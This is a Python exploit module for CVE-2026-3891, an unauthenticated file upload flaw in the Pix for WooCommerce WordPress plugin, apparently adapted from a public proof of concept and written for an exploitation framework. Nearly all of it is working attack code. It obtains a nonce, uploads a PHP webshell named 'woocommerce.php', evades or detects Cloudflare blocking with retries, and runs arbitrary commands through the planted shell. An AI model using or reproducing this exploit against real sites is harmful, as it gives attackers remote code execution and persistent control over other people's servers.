# -*- coding: utf-8 -*-
# CVE-2026-3891 — Pix for WooCommerce <= 1.5.0 Unauth Arbitrary File Upload
# Refactored from Ch4120N PoC. Core logic preserved (WAF detect, retries).
import time
import requests
from typing import Dict, Any

CVE_ID = 'CVE-2026-3891'
CVE_NAME = 'Pix for WooCommerce <= 1.5.0 Unauth Upload'

DEFAULT_FILENAME = "woocommerce.php"
DEFAULT_PAYLOAD = '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>'
WP_AJAX_PATH = "/wp-admin/admin-ajax.php"
UPLOAD_DIR = "wp-content/plugins/payment-gateway-pix-for-woocommerce/Includes/files/certs_c6"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Requested-With": "XMLHttpRequest",
}


# ────────────── internal helpers (dipertahankan dari asli) ──────────────
def _create_session(target: str, timeout: int, log: list) -> requests.Session:
    session = requests.Session()
    headers = HEADERS.copy()
    headers["Origin"] = target
    headers["Referer"] = f"{target}/"
    session.headers.update(headers)

    log.append("Warming up session (fetching homepage)...")
    try:
        resp = session.get(target, timeout=timeout, allow_redirects=True, verify=False)
        log.append(f"Homepage status: {resp.status_code}")

        if resp.status_code == 403:
            log.append("HTTP 403 Forbidden - likely blocked by Cloudflare.")
            return None

        server_header = resp.headers.get("Server", "").lower()
        if "cf-ray" in resp.headers or "cf-mitigated" in server_header:
            log.append("Cloudflare detected - session cookies captured.")

        time.sleep(1)
    except requests.exceptions.RequestException as e:
        log.append(f"Homepage request failed: {e}")

    return session


def _fetch_nonce(session: requests.Session, ajax_url: str,
                 timeout: int, max_retries: int, log: list) -> str:
    for attempt in range(1, max_retries + 1):
        log.append(f"Requesting nonce (attempt {attempt}/{max_retries})...")
        try:
            resp = session.post(
                ajax_url,
                data={
                    "action": "lkn_pix_for_woocommerce_generate_nonce",
                    "action_name": "lkn_pix_for_woocommerce_c6_settings_nonce"
                },
                timeout=timeout, verify=False
            )
        except requests.exceptions.Timeout:
            log.append("Request timed out.")
            if attempt < max_retries:
                time.sleep(2)
                continue
            return None
        except requests.exceptions.ConnectionError as e:
            log.append(f"Connection error: {e}")
            return None

        log.append(f"Response status: {resp.status_code}")

        if resp.status_code == 403:
            log.append("HTTP 403 - Cloudflare/WAF blocking.")
            if "cf-ray" in resp.headers:
                log.append(f"CF-Ray: {resp.headers['cf-ray']}")
            if attempt < max_retries:
                time.sleep(3)
                continue
            else:
                return None

        if resp.status_code != 200:
            log.append(f"Unexpected HTTP status: {resp.status_code}")
            log.append(f"Response preview: {resp.text[:200]}")
            if attempt < max_retries:
                time.sleep(2)
                continue
            return None

        content_type = resp.headers.get("Content-Type", "")
        if "text/html" in content_type:
            log.append("Received HTML instead of JSON - likely a Cloudflare challenge.")
            if attempt < max_retries:
                time.sleep(3)
                continue
            return None

        try:
            data: Dict[str, Any] = resp.json()
        except ValueError:
            log.append("Response is not valid JSON.")
            return None

        if isinstance(data, int):
            log.append(f"WordPress returned bare integer: {data}")
            if attempt < max_retries:
                time.sleep(2)
                continue
            return None

        if not isinstance(data, dict):
            return None

        if not data.get("success") and "data" not in data:
            log.append(f"Request failed. Full response: {data}")
            return None

        payload = data.get("data", {})
        if isinstance(payload, int):
            log.append(f"'data' field is an integer ({payload}), expected object.")
            return None

        if not isinstance(payload, dict) or "nonce" not in payload:
            log.append(f"Unexpected 'data' structure: {payload}")
            return None

        nonce = payload["nonce"]
        log.append(f"Nonce obtained: {nonce}")
        return nonce

    log.append("Failed to obtain nonce after all retries.")
    return None


def _upload_payload(session: requests.Session, ajax_url: str, nonce: str,
                    filename: str, content: str, timeout: int, log: list) -> bool:
    log.append(f"Uploading payload as {filename}...")
    try:
        resp = session.post(
            ajax_url,
            data={
                "action": "lkn_pix_for_woocommerce_c6_save_settings",
                "_ajax_nonce": nonce
            },
            files={
                "certificate_crt_path": (filename, content, "text/plain")
            },
            timeout=timeout, verify=False
        )
    except requests.exceptions.RequestException as e:
        log.append(f"Upload request failed: {e}")
        return False

    log.append(f"Upload response status: {resp.status_code}")
    try:
        result = resp.json()
    except ValueError:
        log.append(f"Upload response is not valid JSON: {resp.text[:200]}")
        return False

    if isinstance(result, int):
        log.append(f"Upload returned bare integer: {result}")
        return False

    if not result.get("success"):
        log.append("Upload failed according to server response.")
        return False

    log.append("Payload delivered to server.")
    return True


def _verify_upload(target: str, filename: str, timeout: int, log: list) -> bool:
    url = f"{target}/{UPLOAD_DIR}/{filename}"
    log.append(f"Verifying uploaded file at: {url}")
    try:
        r = requests.head(url, timeout=timeout, allow_redirects=False, verify=False)
        if r.status_code == 200:
            log.append("File is accessible (HTTP 200).")
            return True
        else:
            log.append(f"File returned HTTP {r.status_code} - may not be accessible.")
            return False
    except requests.exceptions.RequestException as e:
        log.append(f"Verification request failed: {e}")
        return False


def _run_check_command(target: str, filename: str, timeout: int, command: str, log: list) -> str:
    url = f"{target}/{UPLOAD_DIR}/{filename}?cmd={command}"
    log.append(f"Checking shell with command: {command}")
    try:
        r = requests.get(url, timeout=timeout, verify=False)
        if r.status_code == 200 and r.text.strip():
            return r.text.strip()
        else:
            log.append(f"Shell did not return expected output (status {r.status_code}).")
    except requests.exceptions.RequestException as e:
        log.append(f"Check request failed: {e}")
    return ""


# ────────────── public exec helper ──────────────
def run(shell_url, cmd, timeout=15):
    """Execute a command via the uploaded webshell."""
    try:
        url = f"{shell_url}?cmd={cmd}"
        r = requests.get(url, timeout=timeout, verify=False)
        return r.text.strip()
    except Exception as e:
        return f"<cmd error: {e}>"


# ────────────── PUBLIC FUNCTION ──────────────
def exploit(target_url, filename=DEFAULT_FILENAME, payload=DEFAULT_PAYLOAD,
            timeout=15, retries=2, check=True, no_verify=False,
            command='id', debug=False):
    """
    Exploit CVE-2026-3891 (Pix for WooCommerce unauth file upload).

    Args:
        target_url : str  — Base URL dari WordPress target
        filename   : str  — Nama file shell yang di-upload
        payload    : str  — Isi kode PHP yang di-upload
        timeout    : int  — Request timeout
        retries    : int  — Maksimal retry untuk dapetin nonce
        check      : bool — Cek eksekusi command (bawaan: True)
        no_verify  : bool — Skip pengecekan HTTP 200 file hasil upload
        command    : str  — Command yang dijalanin buat ngetes RCE
        debug      : bool — Kumpulin log langkah-langkah

    Returns:
        dict — Kontrak standar (vulnerable, exploited, output, shell_url, dll)
    """
    res = {
        'target': target_url,
        'cve': CVE_ID,
        'plugin': 'pix-for-woocommerce',
        'endpoint': None,
        'http_status': None,
        'vulnerable': False,
        'rce_verified': 'NO',
        'output': '',
        'shell_url': '',
        'marker': '',
        'detail': '',
        'exploited': False,
        'log': [],
    }
    log = res['log']

    if not target_url or not target_url.strip():
        res['detail'] = 'empty target'
        return res

    # Normalize target URL
    target = target_url.strip().rstrip("/")
    if not target.startswith(("http://", "https://")):
        target = f"http://{target}"
    res['target'] = target
    ajax_url = f"{target}{WP_AJAX_PATH}"
    res['endpoint'] = ajax_url

    # 1. Session warm-up
    session = _create_session(target, timeout, log)
    if session is None:
        res['detail'] = 'Session blocked (Cloudflare/WAF 403)'
        return res

    # 2. Obtain nonce
    nonce = _fetch_nonce(session, ajax_url, timeout, retries, log)
    if not nonce:
        res['detail'] = 'Could not obtain nonce'
        return res

    # 3. Upload payload
    if not _upload_payload(session, ajax_url, nonce, filename, payload, timeout, log):
        res['detail'] = 'Exploit failed during upload'
        return res

    res['vulnerable'] = True
    uploaded_url = f"{target}/{UPLOAD_DIR}/{filename}"
    res['shell_url'] = uploaded_url

    # 4. Verification (unless disabled)
    if not no_verify:
        if _verify_upload(target, filename, timeout, log):
            res['exploited'] = True
            res['rce_verified'] = 'YES'
            res['detail'] = 'Shell accessible via HTTP 200'
        else:
            res['detail'] = 'Uploaded but HTTP check failed'

    # 5. Optional command execution check
    if check:
        out = _run_check_command(target, filename, timeout, command, log)
        if out:
            res['output'] = out[:500]
            if not res['exploited']:
                res['exploited'] = True
                res['rce_verified'] = 'YES'
                res['detail'] = 'Command executed successfully'

    return res